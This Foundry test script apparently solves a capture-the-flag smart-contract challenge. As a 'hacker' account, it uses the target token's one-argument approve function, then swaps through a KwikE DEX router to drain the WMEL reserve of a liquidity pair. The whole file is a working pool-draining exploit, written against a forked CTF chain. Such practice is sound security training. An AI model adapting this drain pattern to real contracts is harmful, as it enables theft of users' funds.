// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/chall02/chall02.sol";
import "../src/DexFiles/Library.sol";
import "forge-std/console.sol";

contract ContractTest is Test {

    address hacker = vm.addr(1);
    address wmel = 0xD70a0793824bAf9131Be18E237eb69272667CD27;

    hero2302 public target;
    IKwikEFactory public factory;
    IKwikEPair public kpair;
    IKwikERouter02 public router;


    function setUp() public {
        target = hero2302(0x248866861FA9dDF127A606eb41C6461beeDd5986);
        factory = IKwikEFactory(0x3b9061ED9A1dc4160b0EF70f51B94525cD86DAF2);
        router = IKwikERouter02(0x6ACfbB0d67fc87363333e12A3Bb2cda12ADb1352); 
    }

    function testExploit() public {
        vm.createSelectFork(vm.rpcUrl("CTFblockchain"));
        vm.startPrank(hacker);

        address[] memory t = new address[](2);
        t[0] = address(target);
        t[1] = wmel;

        uint valueOut = 19550000000000000000;

        uint[] memory amountsIn = router.getAmountsIn(valueOut,t);
        uint hackamount = amountsIn[0];
        target.approve(hackamount);

        target.approve(address(router),hackamount);
 
        router.swapExactTokensForTokens(hackamount,0,t,hacker,block.timestamp+2 days);

        kpair = IKwikEPair(factory.getPair(address(target),wmel));
        (uint112 amount00, uint112 amount01,) = kpair.getReserves();
        console.log("Amount0 in reserve : ",amount00,"addr 0 : ",kpair.token0());
        console.log("Amount1 in reserve : ",amount01,"addr 1 : ",kpair.token1());

        assertLt(amount01,0.5 ether);
    }
}
